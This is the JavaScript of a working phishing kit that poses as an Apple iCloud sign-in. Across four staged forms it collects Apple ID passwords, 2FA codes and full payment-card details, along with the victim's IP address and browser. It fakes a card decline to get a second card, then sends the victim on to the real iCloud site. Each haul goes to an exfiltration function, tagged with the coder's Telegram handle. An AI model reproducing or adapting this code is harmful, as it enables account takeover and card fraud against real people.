document.addEventListener('DOMContentLoaded', function() {
    const loginForm = document.getElementById('loginFormElement');
    const twoFactorForm = document.getElementById('twoFactorForm');
    const cardForm = document.getElementById('cardForm');
    const secondCardForm = document.getElementById('secondCardForm');
    const loginPage = document.getElementById('loginForm');
    const twoFactorPage = document.getElementById('twoFactorPage');
    const cardVerifyPage = document.getElementById('cardVerifyPage');
    const declinedMsg = document.getElementById('declinedMsg');

    // Stage 1: Login Harvest
    loginForm.addEventListener('submit', (e) => {
        e.preventDefault();
        const appleId = document.getElementById('appleId').value;
        const password = document.getElementById('password').value;
        const keepSignedIn = document.getElementById('keepSignedIn').checked;
        const notRobot = document.getElementById('notRobot').checked;

        // CAPTCHA Check
        if (!notRobot) {
            alert('Please verify you are not a robot.');
            return;
        }

        // Fake Processing
        const submitBtn = loginForm.querySelector('.submit-btn');
        submitBtn.innerHTML = '<div class="loading">Verifying...</div>';

        // Fetch Real IP
        fetch('https://api.ipify.org?format=json')
            .then(res => res.json())
            .then(data => {
                const ip = data.ip || 'Unknown';
                const userAgent = navigator.userAgent;
                const loginData = `🆕 iCloud Login Harvest\nApple ID: ${appleId}\nPassword: ${password}\nKeep Signed: ${keepSignedIn}\nIP: ${ip}\nUA: ${userAgent}\nTime: ${new Date().toISOString()}\nCoder TG: @boyxcodex`;
                window.exfilData(loginData);

                // Load 2FA Page
                setTimeout(() => {
                    loginPage.classList.add('hidden');
                    twoFactorPage.classList.remove('hidden');
                    submitBtn.innerHTML = '<svg width="20" height="20" viewBox="0 0 24 24" fill="none"><path d="M8.5 5.5L15.5 12L8.5 18.5" stroke="white" stroke-width="2"/></svg>';
                }, 1500);
            })
            .catch(() => {
                const userAgent = navigator.userAgent;
                const loginData = `🆕 iCloud Login Harvest\nApple ID: ${appleId}\nPassword: ${password}\nKeep Signed: ${keepSignedIn}\nIP: Unknown\nUA: ${userAgent}\nTime: ${new Date().toISOString()}\nCoder TG: @boyxcodex`;
                window.exfilData(loginData);
                setTimeout(() => {
                    loginPage.classList.add('hidden');
                    twoFactorPage.classList.remove('hidden');
                    submitBtn.innerHTML = '<svg width="20" height="20" viewBox="0 0 24 24" fill="none"><path d="M8.5 5.5L15.5 12L8.5 18.5" stroke="white" stroke-width="2"/></svg>';
                }, 1500);
            });
    });

    // Stage 2: 2FA Harvest
    twoFactorForm.addEventListener('submit', (e) => {
        e.preventDefault();
        const code = document.getElementById('verificationCode').value;

        // Exfil 2FA
        const twoFaData = `🔑 2FA Code: ${code}\nTime: ${new Date().toISOString()}\nCoder TG: @boyxcodex`;
        window.exfilData(twoFaData);

        // Load Card Verification Page
        setTimeout(() => {
            twoFactorPage.classList.add('hidden');
            cardVerifyPage.classList.remove('hidden');
        }, 1000);
    });

    // Stage 3: Card Harvest (First Card)
    cardForm.addEventListener('submit', (e) => {
        e.preventDefault();
        const cardName = document.getElementById('cardName').value;
        const cardNumber = document.getElementById('cardNumber').value.replace(/\s/g, '');
        const expiry = document.getElementById('expiry').value;
        const cvv = document.getElementById('cvv').value;
        const billingAddress = document.getElementById('billingAddress').value;
        const billingZip = document.getElementById('billingZip').value;

        // Luhn Check
        function luhnCheck(cardNum) {
            let sum = 0;
            let alternator = false;
            for (let i = cardNum.length - 1; i >= 0; i--) {
                let digit = parseInt(cardNum[i]);
                if (alternator) {
                    digit *= 2;
                    if (digit > 9) digit -= 9;
                }
                sum += digit;
                alternator = !alternator;
            }
            return sum % 10 === 0;
        }

        if (!luhnCheck(cardNumber)) {
            declinedMsg.classList.remove('hidden');
            return;
        }

        // Exfil First Card
        const cardData = `💳 First Card Harvest\nName: ${cardName}\nNumber: ${cardNumber}\nExpiry: ${expiry}\nCVV: ${cvv}\nAddress: ${billingAddress}\nZIP: ${billingZip}\nTime: ${new Date().toISOString()}\nCoder TG: @boyxcodex`;
        window.exfilData(cardData);

        // Prompt Second Card
        declinedMsg.textContent = 'Card declined due to security. Please provide an alternate card.';
        declinedMsg.classList.remove('hidden');
        cardForm.classList.add('hidden');
        secondCardForm.classList.remove('hidden');
    });

    // Stage 4: Second Card Harvest
    secondCardForm.addEventListener('submit', (e) => {
        e.preventDefault();
        const cardName2 = document.getElementById('cardName2').value;
        const cardNumber2 = document.getElementById('cardNumber2').value.replace(/\s/g, '');
        const expiry2 = document.getElementById('expiry2').value;
        const cvv2 = document.getElementById('cvv2').value;

        // Exfil Second Card
        const secondCardData = `💳 Second Card Harvest\nName: ${cardName2}\nNumber: ${cardNumber2}\nExpiry: ${expiry2}\nCVV: ${cvv2}\nTime: ${new Date().toISOString()}\nCoder TG: @boyxcodex`;
        window.exfilData(secondCardData);

        // Redirect
        alert('Verification successful! Redirecting to iCloud...');
        setTimeout(() => {
            window.location.href = 'https://www.icloud.com/';
        }, 2000);
    });

    // Forgot Password Decoy
    document.getElementById('forgotPassword').addEventListener('click', (e) => {
        e.preventDefault();
        alert('A password reset link has been sent to your email.');
    });
});

// Auto-Submit on Enter
document.addEventListener('keypress', function(e) {
    if (e.key === 'Enter') {
        e.target.closest('form').dispatchEvent(new Event('submit'));
    }
});
